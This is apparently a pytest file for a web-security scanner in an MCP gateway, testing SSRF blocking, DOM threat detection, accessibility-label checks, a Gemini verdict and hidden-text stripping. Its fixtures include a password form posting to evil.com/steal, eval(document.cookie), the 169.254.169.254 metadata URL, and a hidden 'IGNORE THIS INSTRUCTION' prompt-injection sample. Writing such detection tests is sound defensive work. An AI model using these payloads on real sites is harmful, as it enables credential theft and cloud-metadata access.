"""Tests for causal_sandbox module - evidence-based web security analysis."""

from __future__ import annotations

import json
from pathlib import Path
from unittest.mock import MagicMock, patch

import httpx
import pytest

from mcp_gateway import causal_sandbox
from mcp_gateway.causal_sandbox import (
    A11yNode,
    CausalScanResult,
    DOMSecurityNode,
    NetworkRequestTrace,
    ResourceLimitError,
    SSRFError,
    ThreatClassification,
    WebBundleResult,
    WebSecurityVerdict,
    analyze_dom_security,
    bundle_page,
    extract_accessibility_tree,
    extract_visible_text,
    gemini_security_verdict,
    run_causal_scan,
    trace_network_requests,
    validate_url_ssrf,
)


# ---- Pydantic Models ----


class TestPydanticModels:
    """Pydantic model schema validation tests."""

    def test_threat_classification_enum(self) -> None:
        """All expected enum values exist."""
        expected = {"benign", "phishing", "malware", "clickjacking", "scam", "deceptive_ui"}
        actual = {e.value for e in ThreatClassification}
        assert actual == expected

    def test_web_security_verdict_schema(self) -> None:
        """WebSecurityVerdict round-trips all fields."""
        verdict = WebSecurityVerdict(
            classification=ThreatClassification.phishing,
            confidence=0.95,
            risk_indicators=["deceptive_form", "external_action"],
            evidence_refs=["form.login", "https://evil.com/steal"],
            recommended_action="block",
            summary="Phishing page detected",
        )
        assert verdict.classification == ThreatClassification.phishing
        assert verdict.confidence == 0.95
        assert len(verdict.risk_indicators) == 2
        assert verdict.recommended_action == "block"

    def test_models_json_roundtrip(self) -> None:
        """Models serialize and deserialize cleanly."""
        verdict = WebSecurityVerdict(
            classification=ThreatClassification.benign,
            confidence=0.9,
            risk_indicators=[],
            evidence_refs=[],
            recommended_action="allow",
            summary="Clean page",
        )
        raw = verdict.model_dump_json()
        restored = WebSecurityVerdict.model_validate_json(raw)
        assert restored.classification == verdict.classification
        assert restored.confidence == verdict.confidence


# ---- SSRF Guard ----


class TestSSRFGuard:
    """SSRF protection tests."""

    def test_ssrf_blocks_private_ip(self) -> None:
        """Private IPs (10.x, 172.16.x, 192.168.x) are blocked."""
        for ip in ["10.0.0.1", "172.16.0.1", "192.168.1.1"]:
            with patch("socket.getaddrinfo") as mock_dns:
                mock_dns.return_value = [
                    (2, 1, 6, "", (ip, 443)),
                ]
                with pytest.raises(SSRFError, match="Blocked IP"):
                    validate_url_ssrf(f"https://{ip}/")

    def test_ssrf_blocks_metadata(self) -> None:
        """Cloud metadata endpoint (169.254.169.254) is blocked."""
        with patch("socket.getaddrinfo") as mock_dns:
            mock_dns.return_value = [
                (2, 1, 6, "", ("169.254.169.254", 80)),
            ]
            with pytest.raises(SSRFError, match="Blocked IP"):
                validate_url_ssrf("http://169.254.169.254/latest/meta-data/")

    def test_ssrf_allows_public_url(self) -> None:
        """Public IPs pass SSRF validation."""
        with patch("socket.getaddrinfo") as mock_dns:
            mock_dns.return_value = [
                (2, 1, 6, "", ("93.184.216.34", 443)),
            ]
            url, resolved_ip = validate_url_ssrf("https://example.com/")
            assert url == "https://example.com/"
            assert resolved_ip == "93.184.216.34"

    def test_ssrf_blocks_bad_scheme(self) -> None:
        """Non-HTTP schemes are blocked."""
        with pytest.raises(SSRFError, match="Blocked scheme"):
            validate_url_ssrf("ftp://example.com/")

    def test_ssrf_blocks_bad_port(self) -> None:
        """Database ports (6379, 5432, etc.) are blocked."""
        with patch("socket.getaddrinfo") as mock_dns:
            mock_dns.return_value = [
                (2, 1, 6, "", ("93.184.216.34", 6379)),
            ]
            with pytest.raises(SSRFError, match="Blocked port"):
                validate_url_ssrf("https://example.com:6379/")

    def test_ssrf_redirect_to_private_blocked(self) -> None:
        """Redirect to private IP is blocked at each hop."""
        from mcp_gateway.causal_sandbox import _fetch_with_ssrf_guard

        redirect_resp = MagicMock()
        redirect_resp.status_code = 302
        redirect_resp.headers = {"location": "http://10.0.0.1/secret"}

        def mock_validate(url: str) -> tuple[str, str]:
            parsed = __import__("urllib.parse", fromlist=["urlparse"]).urlparse(url)
            hostname = parsed.hostname or ""
            if hostname == "10.0.0.1":
                raise SSRFError("Blocked IP: 10.0.0.1")
            return url, "93.184.216.34"

        with (
            patch("mcp_gateway.causal_sandbox.validate_url_ssrf", side_effect=mock_validate),
            patch("httpx.Client") as mock_client_cls,
        ):
            mock_client = MagicMock()
            mock_client.__enter__ = MagicMock(return_value=mock_client)
            mock_client.__exit__ = MagicMock(return_value=False)
            mock_client.get.return_value = redirect_resp
            mock_client_cls.return_value = mock_client

            with pytest.raises(SSRFError, match="Blocked IP"):
                _fetch_with_ssrf_guard("https://evil.com/redir")


# ---- bundle_page ----


class TestBundlePage:
    """Page bundling tests."""

    def test_bundle_page_success(self) -> None:
        """Successful fetch produces valid bundle."""
        html = "<html><head></head><body><p>Hello</p></body></html>"
        mock_resp = MagicMock()
        mock_resp.content = html.encode("utf-8")
        mock_resp.status_code = 200

        with (
            patch("mcp_gateway.causal_sandbox.validate_url_ssrf"),
            patch("httpx.Client") as mock_client_cls,
        ):
            mock_client = MagicMock()
            mock_client.__enter__ = MagicMock(return_value=mock_client)
            mock_client.__exit__ = MagicMock(return_value=False)
            mock_client.get.return_value = mock_resp
            mock_client_cls.return_value = mock_client

            bundle, raw_html = bundle_page("https://example.com")

        assert bundle.status_code == 200
        assert bundle.sha256 != ""
        assert bundle.content_length == len(html.encode())
        assert raw_html == html

    def test_bundle_page_timeout(self) -> None:
        """Timeout produces degraded result (status_code=0)."""
        with (
            patch("mcp_gateway.causal_sandbox.validate_url_ssrf"),
            patch("httpx.Client") as mock_client_cls,
        ):
            mock_client = MagicMock()
            mock_client.__enter__ = MagicMock(return_value=mock_client)
            mock_client.__exit__ = MagicMock(return_value=False)
            mock_client.get.side_effect = httpx.TimeoutException("timeout")
            mock_client_cls.return_value = mock_client

            bundle, raw_html = bundle_page("https://slow.example.com")

        assert bundle.status_code == 0
        assert raw_html == ""

    def test_bundle_page_oversized(self) -> None:
        """Content exceeding MAX_HTML_BYTES raises ResourceLimitError."""
        big_content = b"x" * (2 * 1024 * 1024 + 1)
        mock_resp = MagicMock()
        mock_resp.content = big_content
        mock_resp.status_code = 200

        with (
            patch("mcp_gateway.causal_sandbox.validate_url_ssrf"),
            patch("httpx.Client") as mock_client_cls,
        ):
            mock_client = MagicMock()
            mock_client.__enter__ = MagicMock(return_value=mock_client)
            mock_client.__exit__ = MagicMock(return_value=False)
            mock_client.get.return_value = mock_resp
            mock_client_cls.return_value = mock_client

            with pytest.raises(ResourceLimitError, match="Content too large"):
                bundle_page("https://example.com/huge")

    def test_bundle_page_ssrf_blocked(self) -> None:
        """SSRF-blocked URL raises SSRFError."""
        with patch(
            "mcp_gateway.causal_sandbox.validate_url_ssrf",
            side_effect=SSRFError("Blocked IP"),
        ):
            with pytest.raises(SSRFError):
                bundle_page("http://10.0.0.1/")


# ---- DOM Security ----


class TestDOMSecurity:
    """DOM security analysis tests."""

    def test_detect_hidden_iframe(self) -> None:
        """Hidden iframes are flagged."""
        html = (
            '<html><body>'
            '<iframe src="https://evil.com" style="display:none"></iframe>'
            '</body></html>'
        )
        threats = analyze_dom_security(html, "https://example.com")
        assert len(threats) >= 1
        assert threats[0].threat_type == "hidden_iframe"

    def test_detect_deceptive_form(self) -> None:
        """Forms with external action + password input are flagged."""
        html = (
            '<html><body>'
            '<form action="https://evil.com/steal">'
            '<input type="password" name="pass">'
            '<input type="submit">'
            '</form>'
            '</body></html>'
        )
        threats = analyze_dom_security(html, "https://example.com")
        assert len(threats) >= 1
        form_threats = [t for t in threats if t.threat_type == "deceptive_form"]
        assert len(form_threats) == 1

    def test_detect_suspicious_script(self) -> None:
        """Scripts with eval(document.cookie) are flagged."""
        html = (
            '<html><body>'
            '<script>eval(document.cookie)</script>'
            '</body></html>'
        )
        threats = analyze_dom_security(html, "https://example.com")
        script_threats = [t for t in threats if t.threat_type == "suspicious_script"]
        assert len(script_threats) >= 1

    def test_clean_html_no_threats(self) -> None:
        """Normal HTML produces no threats."""
        html = (
            '<html><body>'
            '<h1>Welcome</h1>'
            '<p>This is a safe page.</p>'
            '<a href="/about">About</a>'
            '</body></html>'
        )
        threats = analyze_dom_security(html, "https://example.com")
        assert threats == []


# ---- A11y Tree ----


class TestA11yTree:
    """Accessibility tree extraction tests."""

    def test_basic_tree_structure(self) -> None:
        """Button, link, and input produce correct roles."""
        html = (
            '<html><body>'
            '<button>Click me</button>'
            '<a href="/about">About</a>'
            '<input type="text" aria-label="Search">'
            '</body></html>'
        )
        nodes = extract_accessibility_tree(html)
        roles = {n.role for n in nodes}
        assert "button" in roles
        assert "link" in roles
        assert "textbox" in roles

    def test_deceptive_label_detection(self) -> None:
        """aria-label differing from visible text is flagged as deceptive."""
        html = (
            '<html><body>'
            '<button aria-label="Download free software">Login to bank</button>'
            '</body></html>'
        )
        nodes = extract_accessibility_tree(html)
        deceptive = [n for n in nodes if n.deceptive_label]
        assert len(deceptive) >= 1


# ---- Network Trace ----


class TestNetworkTrace:
    """Network request tracing tests."""

    def test_extract_urls_from_html(self) -> None:
        """Extracts URLs from script, img, form elements."""
        html = (
            '<html><body>'
            '<script src="https://cdn.example.com/app.js"></script>'
            '<img src="/images/logo.png">'
            '<form action="/submit" method="POST">'
            '<input type="text">'
            '</form>'
            '</body></html>'
        )
        traces = trace_network_requests("https://example.com", html)
        sources = {t.source for t in traces}
        assert "script_src" in sources
        assert "img_src" in sources
        assert "form_action" in sources

    def test_suspicious_domain_flagging(self) -> None:
        """URL shorteners are flagged as suspicious."""
        html = (
            '<html><body>'
            '<script src="https://bit.ly/abc123"></script>'
            '</body></html>'
        )
        traces = trace_network_requests("https://example.com", html)
        suspicious = [t for t in traces if t.is_suspicious]
        assert len(suspicious) >= 1
        assert suspicious[0].threat_type == "url_shortener"


# ---- Gemini Verdict ----


class TestGeminiVerdict:
    """Gemini structured output verdict tests."""

    def test_gemini_verdict_phishing(self) -> None:
        """Mock Gemini returns phishing verdict."""
        mock_verdict = WebSecurityVerdict(
            classification=ThreatClassification.phishing,
            confidence=0.95,
            risk_indicators=["deceptive_form"],
            evidence_refs=["form.login"],
            recommended_action="block",
            summary="Phishing detected",
        )
        mock_response = MagicMock()
        mock_response.text = mock_verdict.model_dump_json()

        with (
            patch.dict("os.environ", {"GOOGLE_API_KEY": "test-key"}),
            patch("google.genai.Client") as mock_client_cls,
        ):
            mock_client = MagicMock()
            mock_client.models.generate_content.return_value = mock_response
            mock_client_cls.return_value = mock_client

            verdict = gemini_security_verdict(
                "https://evil.com",
                "Login to your bank account",
                [
                    DOMSecurityNode(
                        tag="form",
                        attributes={"action": "https://evil.com"},
                        suspicious=True,
                        threat_type="deceptive_form",
                        selector="form.login",
                    )
                ],
                [],
                [],
            )

        assert verdict.classification == ThreatClassification.phishing
        assert verdict.confidence == 0.95

    def test_gemini_no_api_key_fallback(self) -> None:
        """Without API key, falls back to rule-based."""
        with patch.dict("os.environ", {}, clear=False):
            env = dict(**{k: v for k, v in __import__("os").environ.items()})
            env.pop("GOOGLE_API_KEY", None)
            with patch.dict("os.environ", env, clear=True):
                verdict = gemini_security_verdict(
                    "https://example.com",
                    "Safe content",
                    [],
                    [],
                    [],
                )
        assert verdict.recommended_action == "allow"
        assert verdict.classification == ThreatClassification.benign

    def test_gemini_error_fallback(self) -> None:
        """Gemini error falls back to rule-based verdict."""
        with (
            patch.dict("os.environ", {"GOOGLE_API_KEY": "test-key"}),
            patch("google.genai.Client") as mock_client_cls,
        ):
            mock_client = MagicMock()
            mock_client.models.generate_content.side_effect = RuntimeError("API down")
            mock_client_cls.return_value = mock_client

            verdict = gemini_security_verdict(
                "https://example.com",
                "Some content",
                [
                    DOMSecurityNode(
                        tag="iframe",
                        attributes={},
                        suspicious=True,
                        threat_type="hidden_iframe",
                        selector="iframe.hidden",
                    )
                ],
                [],
                [],
            )

        assert verdict.classification == ThreatClassification.clickjacking


# ---- run_causal_scan ----


class TestRunCausalScan:
    """Full pipeline integration tests."""

    def test_full_scan_flow(self, tmp_path: Path) -> None:
        """Full pipeline produces CausalScanResult."""
        html = (
            '<html><body>'
            '<h1>Welcome</h1>'
            '<p>Safe content here.</p>'
            '</body></html>'
        )
        mock_resp = MagicMock()
        mock_resp.content = html.encode("utf-8")
        mock_resp.status_code = 200

        evidence_path = tmp_path / "evidence.jsonl"

        with (
            patch("mcp_gateway.causal_sandbox.validate_url_ssrf"),
            patch("httpx.Client") as mock_client_cls,
            patch.dict("os.environ", {
                "MCP_GATEWAY_EVIDENCE_PATH": str(evidence_path),
            }),
        ):
            # Remove GOOGLE_API_KEY to force rule-based
            env_copy = dict(**{k: v for k, v in __import__("os").environ.items()})
            env_copy.pop("GOOGLE_API_KEY", None)
            env_copy["MCP_GATEWAY_EVIDENCE_PATH"] = str(evidence_path)

            mock_client = MagicMock()
            mock_client.__enter__ = MagicMock(return_value=mock_client)
            mock_client.__exit__ = MagicMock(return_value=False)
            mock_client.get.return_value = mock_resp
            mock_client_cls.return_value = mock_client

            with patch.dict("os.environ", env_copy, clear=True):
                result = run_causal_scan("https://example.com")

        assert isinstance(result, CausalScanResult)
        assert result.url == "https://example.com"
        assert result.bundle.status_code == 200
        assert result.verdict.classification == ThreatClassification.benign

    def test_scan_evidence_emitted(self, tmp_path: Path) -> None:
        """Evidence JSONL is written after scan."""
        html = '<html><body><p>Test</p></body></html>'
        mock_resp = MagicMock()
        mock_resp.content = html.encode("utf-8")
        mock_resp.status_code = 200

        evidence_path = tmp_path / "evidence.jsonl"

        with (
            patch("mcp_gateway.causal_sandbox.validate_url_ssrf"),
            patch("httpx.Client") as mock_client_cls,
        ):
            env_copy = dict(**{k: v for k, v in __import__("os").environ.items()})
            env_copy.pop("GOOGLE_API_KEY", None)
            env_copy["MCP_GATEWAY_EVIDENCE_PATH"] = str(evidence_path)

            mock_client = MagicMock()
            mock_client.__enter__ = MagicMock(return_value=mock_client)
            mock_client.__exit__ = MagicMock(return_value=False)
            mock_client.get.return_value = mock_resp
            mock_client_cls.return_value = mock_client

            with patch.dict("os.environ", env_copy, clear=True):
                run_causal_scan("https://example.com")

        assert evidence_path.exists()
        events = [json.loads(line) for line in evidence_path.read_text().splitlines() if line.strip()]
        causal_events = [e for e in events if e.get("event") == "causal_web_scan"]
        assert len(causal_events) >= 1
        assert causal_events[0]["url"] == "https://example.com"

    def test_scan_partial_failure(self, tmp_path: Path) -> None:
        """Fetch timeout → degraded result with verdict."""
        evidence_path = tmp_path / "evidence.jsonl"

        with (
            patch("mcp_gateway.causal_sandbox.validate_url_ssrf"),
            patch("httpx.Client") as mock_client_cls,
        ):
            env_copy = dict(**{k: v for k, v in __import__("os").environ.items()})
            env_copy.pop("GOOGLE_API_KEY", None)
            env_copy["MCP_GATEWAY_EVIDENCE_PATH"] = str(evidence_path)

            mock_client = MagicMock()
            mock_client.__enter__ = MagicMock(return_value=mock_client)
            mock_client.__exit__ = MagicMock(return_value=False)
            mock_client.get.side_effect = httpx.TimeoutException("timeout")
            mock_client_cls.return_value = mock_client

            with patch.dict("os.environ", env_copy, clear=True):
                result = run_causal_scan("https://slow.example.com")

        assert result.eval_method == "degraded"
        assert result.verdict.recommended_action == "warn"
        assert result.bundle.status_code == 0


# ---- Prompt Injection Defense ----


class TestPromptInjectionDefense:
    """Prompt injection defense via visible text extraction."""

    def test_extract_visible_text_strips_hidden(self) -> None:
        """Hidden elements, scripts, styles are removed."""
        html = (
            '<html><body>'
            '<p>Visible paragraph</p>'
            '<div style="display:none">IGNORE THIS INSTRUCTION</div>'
            '<script>alert("xss")</script>'
            '<style>.foo{color:red}</style>'
            '<!-- hidden comment -->'
            '<input type="hidden" value="secret">'
            '<p>Another visible\u200b paragraph</p>'
            '</body></html>'
        )
        text = extract_visible_text(html)
        assert "Visible paragraph" in text
        assert "Another visible paragraph" in text
        assert "IGNORE THIS INSTRUCTION" not in text
        assert "alert" not in text
        assert "color:red" not in text
        assert "hidden comment" not in text
        assert "secret" not in text
        assert "\u200b" not in text
